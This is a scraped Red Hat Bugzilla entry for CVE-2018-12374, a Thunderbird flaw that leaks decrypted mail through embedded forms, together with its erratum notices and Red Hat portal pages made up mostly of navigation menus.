Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1598544](show_bug.cgi?id=1598544 "CLOSED NOTABUG - CVE-2018-12374 thunderbird: Using form to exfiltrate encrypted mail part by pressing enter in form field [fedora-all]") [1598545](show_bug.cgi?id=1598545) [1598644](show_bug.cgi?id=1598644) [1598645](show_bug.cgi?id=1598645) [1598646](show_bug.cgi?id=1598646) [1607204](show_bug.cgi?id=1607204) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [1596475](show_bug.cgi?id=1596475) | | TreeView+ | [depends on](buglist.cgi?bug_id=1598543&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1598543&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2018-07-05 18:30 UTC by Laura Pardo | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2019-09-29 14:43 UTC ([History](show_activity.cgi?id=1598543)) | | [CC List:](page.cgi?id=fields.html#cclist) | 11 users (show)  alexl cschalle gecko-bugs-nobody gecko-bugs-nobody jhorak john.j5live pjasicek rhughes rstrode sandmann stransky | | Fixed In Version: | thunderbird 52.9 | | | Doc Type: | If docs needed, set a value | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2019-06-10 10:31:59 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2018:2251](https://access.redhat.com/errata/RHSA-2018%3A2251) | 0 | None | None | None | 2018-07-24 21:35:08 UTC | | Red Hat Product Errata | [RHSA-2018:2252](https://access.redhat.com/errata/RHSA-2018%3A2252) | 0 | None | None | None | 2018-07-24 21:34:24 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1598543#c0)  Laura Pardo    2018-07-05 18:30:26 UTC  ``` A flaw was found in Mozilla Thunderbird before version 52.9. Plaintext of decrypted emails can leak through by user submitting an embedded form by pressing enter key within a text input field.   References: <https://www.mozilla.org/en-US/security/advisories/mfsa2018-18/#CVE-2018-12374>   ```  [Comment 1](show_bug.cgi?id=1598543#c1)  Laura Pardo    2018-07-05 18:30:58 UTC  ``` Created thunderbird tracking bugs for this issue:  Affects: fedora-all [[bug 1598544](show_bug.cgi?id=1598544 "CLOSED NOTABUG - CVE-2018-12374 thunderbird: Using form to exfiltrate encrypted mail part by pressing enter in form field [fedora-all]")]   ```  [Comment 5](show_bug.cgi?id=1598543#c5)  errata-xmlrpc    2018-07-24 21:34:18 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2018:2252 [https://access.redhat.com/errata/RHSA-2018:2252](https://access.redhat.com/errata/RHSA-2018%3A2252)   ```  [Comment 6](show_bug.cgi?id=1598543#c6)  errata-xmlrpc    2018-07-24 21:35:01 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 6  Via RHSA-2018:2251 [https://access.redhat.com/errata/RHSA-2018:2251](https://access.redhat.com/errata/RHSA-2018%3A2251)   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1598543&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from www.redhat.com_b643573b_20250126_073637.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.redhat.com_38aca3fe_20250126_073635.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from access.redhat.com_4494be49_20250125_084119.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2018:2252 - Security Advisory

Issued:
2018-07-24
Updated:
2018-07-24
# RHSA-2018:2252 - Security Advisory

